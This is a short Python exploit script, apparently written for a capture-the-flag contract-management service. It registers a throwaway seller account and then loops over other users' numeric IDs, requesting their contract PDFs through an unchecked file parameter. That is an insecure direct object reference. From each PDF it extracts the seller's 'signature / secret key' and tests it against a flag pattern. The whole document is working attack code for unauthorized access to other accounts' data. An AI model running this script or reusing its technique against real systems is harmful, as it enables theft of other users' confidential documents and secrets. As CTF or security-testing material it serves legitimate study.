#!/usr/bin/env python3
import sys, random, string, re, requests

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = sys.argv[2] if len(sys.argv) > 2 else "8090"
BASE = f"http://{host}:{port}"

s = requests.Session()
username = "att_" + "".join(random.choices(string.ascii_lowercase, k=8))
password = "password123"

# 1. register seller
r = s.post(f"{BASE}/api/register", json={
    "username": username, "password": password, "role": "seller",
    "company_name": "OOO Test", "tax_id": "TAX-1234567", "signature": "SIG-test"
})
print(f"register: {r.status_code} {r.text[:200]}")
if r.status_code not in (200, 201):
    sys.exit(1)

me = s.get(f"{BASE}/api/me").json()
print(f"me: {me}")
my_id = me["id"]
print(f"[+] my seller id={my_id}, scanning 1..{my_id + 50}")

found = 0
for victim_id in range(1, my_id + 50):
    if victim_id == my_id:
        continue
    r = s.get(f"{BASE}/api/contract", params={"file": f"contract-{victim_id}"})
    if r.status_code != 200:
        continue
    text = r.content.decode("latin-1")
    marker = "Seller signature / secret key:"
    idx = text.find(marker)
    if idx == -1:
        print(f"victim {victim_id}: pdf found but no marker")
        continue
    # всё в Tj-строках после маркера до конца потока
    tjs = re.findall(r"\(([^)]+)\)\s+Tj", text[idx:])
    sig = tjs[0].strip() if tjs else ""
    if re.fullmatch(r"[A-Z0-9]{31}=", sig):
        print(f"victim {victim_id}: FLAG {sig}")
    else:
        print(f"victim {victim_id}: {sig}")
    found += 1

print(f"\n[+] done, found {found} contracts")
